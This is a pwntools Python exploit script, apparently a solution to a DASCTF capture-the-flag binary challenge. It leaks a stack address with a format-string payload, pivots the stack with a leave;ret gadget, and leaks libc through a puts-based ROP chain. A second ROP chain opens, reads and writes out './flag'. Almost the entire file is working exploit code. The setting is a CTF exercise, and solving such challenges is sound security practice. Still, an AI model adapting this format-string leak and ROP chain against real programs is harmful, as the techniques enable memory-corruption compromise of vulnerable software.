from pwn import *
import time

context.log_level = 'debug'
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    # io = process(vuln_path)
    io = process([vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("tcp.cloud.dasctf.com", 21495)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


# leack stack
io.sendlineafter("your name:\n", "%5$p")
io.recvuntil("0x", drop=True)

buf_stack = int(io.recv()[:12], 16) + 8
success("buf_stack -> " + hex(buf_stack))

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_plt = elf.plt['read']
leave_ret = 0x4012e1
pop_rdi_ret = 0x0401413
main_addr = 0x4012E3

# return -> main ->leak libc
payload = p64(0) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
payload = payload.ljust(0xB0, b"\x00")
payload += p64(buf_stack) + p64(leave_ret)

io.send(payload)

libc_puts = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc.address = libc_puts - libc.symbols["puts"]
success("libc address -> " + hex(libc.address))

pop_rsi = roplibc.rsi.address + libc.address
pop_rdi = roplibc.rdi.address + libc.address
pop_rdx = roplibc.rdx.address + libc.address
openaddr = libc.symbols['open']
readaddr = libc.symbols['read']
writeaddr = libc.symbols['write']

bssaddr = 0x404080 + 0x100

# orw
new_buf_address = buf_stack - 144
payload = p64(0) + p64(pop_rdi) + p64(new_buf_address + 8 * 20) + p64(pop_rsi) + p64(0) + p64(openaddr) #open
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bssaddr + 0x50) + p64(pop_rdx) + p64(0x30) + p64(readaddr) #read
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bssaddr + 0x50) + p64(pop_rdx) + p64(0x30) + p64(
    writeaddr) # write
payload += b"./flag\x00"
payload = payload.ljust(0xB0, b"\x00")
payload += p64(new_buf_address) + p64(leave_ret)

io.sendlineafter("DASCTF:\n", payload)

io.interactive()
